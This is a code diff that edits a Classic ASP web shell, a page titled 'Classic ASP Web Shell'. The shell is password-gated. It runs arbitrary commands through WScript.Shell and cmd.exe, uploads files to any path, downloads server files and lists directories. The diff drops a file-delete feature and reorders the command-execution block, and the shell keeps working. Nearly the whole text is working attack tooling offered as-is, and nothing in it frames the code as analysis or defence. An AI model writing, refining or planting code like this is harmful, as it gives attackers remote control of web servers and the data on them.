@@ -18,35 +18,32 @@ If auth <> PASSWORD Then
 End If
 
 ' ===================== VARIABLES =====================
-Dim path, cmd, download, del
+Dim path, cmd, download
 path = Trim(Request("path"))
 If path = "" Then path = Server.MapPath(".")
 
 cmd = Request("cmd")
 download = Request("download")
-del = Request("delete")
 
-' ===================== UPLOAD FILE (CORRECTED) =====================
+' ===================== UPLOAD FILE =====================
 If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
     On Error Resume Next
     Dim fso, stream, binData, fileName, savePath
     
     Set fso = Server.CreateObject("Scripting.FileSystemObject")
     
-    ' Get uploaded file name
     fileName = Request.Form("file")
     If fileName <> "" Then
         fileName = fso.GetFileName(fileName)
         savePath = path & "\" & fileName
         
-        ' Read binary data and save
         binData = Request.BinaryRead(Request.TotalBytes)
         
         Set stream = Server.CreateObject("ADODB.Stream")
-        stream.Type = 1 ' Binary
+        stream.Type = 1
         stream.Open
         stream.Write binData
-        stream.SaveToFile savePath, 2 ' Overwrite
+        stream.SaveToFile savePath, 2
         stream.Close
         
         If Err.Number = 0 Then
@@ -57,32 +54,6 @@ If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
     Else
         output = "No file selected!"
     End If
-    On Error GoTo 0
-End If
-
-' ===================== DELETE FILE =====================
-If del <> "" Then
-    On Error Resume Next
-    Set fso = Server.CreateObject("Scripting.FileSystemObject")
-    Dim fileToDel : fileToDel = path & "\" & del
-    If fso.FileExists(fileToDel) Then
-        fso.DeleteFile fileToDel
-        output = "File deleted: " & del
-    Else
-        output = "File not found: " & del
-    End If
-    If Err.Number <> 0 Then output = "Delete Error: " & Err.Description
-    On Error GoTo 0
-End If
-
-' ===================== COMMAND EXECUTION =====================
-If cmd <> "" Then
-    On Error Resume Next
-    Dim WShell, exec
-    Set WShell = Server.CreateObject("WScript.Shell")
-    Set exec = WShell.Exec("cmd.exe /c " & cmd)
-    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
-    If Err.Number <> 0 Then output = "Cmd Error: " & Err.Description
     On Error GoTo 0
 End If
 
@@ -99,6 +70,17 @@ If download <> "" Then
     dstream.Close
     Response.End
 End If
+
+' ===================== COMMAND EXECUTION =====================
+If cmd <> "" Then
+    On Error Resume Next
+    Dim WShell, exec
+    Set WShell = Server.CreateObject("WScript.Shell")
+    Set exec = WShell.Exec("cmd.exe /c " & cmd)
+    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
+    If Err.Number <> 0 Then output = "Cmd Error: " & Err.Description
+    On Error GoTo 0
+End If
 %>
 
 <html>
@@ -107,12 +89,12 @@ End If
     <style>
         body{font-family:monospace; background:#111; color:#0f0;}
         input, button {padding:5px;}
-        pre {background:#222; padding:10px; color:#0f0;}
+        pre {background:#222; padding:10px;}
     </style>
 </head>
 <body>
     <h2>Classic ASP Web Shell</h2>
-   
+    
     <form method="get">
         Path: <input type="text" name="path" value="<%=Server.HTMLEncode(path)%>" style="width:500px"/>
         <input type="submit" value="Browse"/>
@@ -123,14 +105,13 @@ End If
         <input type="submit" value="Run"/>
     </form>
     
-    <!-- Upload Form -->
     <form method="post" enctype="multipart/form-data">
+        Upload file: <input type="file" name="file"/>
+        <input type="submit" value="Upload"/>
         <input type="hidden" name="path" value="<%=Server.HTMLEncode(path)%>"/>
-        Upload: <input type="file" name="file"/>
-        <input type="submit" value="Upload File"/>
     </form>
-    <hr>
     
+    <hr>
     <pre><%=Server.HTMLEncode(output)%></pre>
     <%= ListFiles(path) %>
 </body>
@@ -148,14 +129,15 @@ Function ListFiles(p)
     If fso.FolderExists(p) Then
         Set folder = fso.GetFolder(p)
        
+        ' Folders
         For Each item In folder.SubFolders
             html = html & "<li><a href='?path=" & Server.URLEncode(item.Path) & "'><b>[" & Server.HTMLEncode(item.Name) & "]</b></a></li>"
         Next
        
+        ' Files
         For Each item In folder.Files
             html = html & "<li>" & Server.HTMLEncode(item.Name) & " - " & _
-                         "<a href='?download=" & Server.URLEncode(item.Path) & "'>[Download]</a> | " & _
-                         "<a href='?delete=" & Server.URLEncode(item.Name) & "'>[Delete]</a></li>"
+                         "<a href='?download=" & Server.URLEncode(item.Path) & "'>[Download]</a></li>"
         Next
     Else
         html = html & "<li style='color:red'>Path not found!</li>"
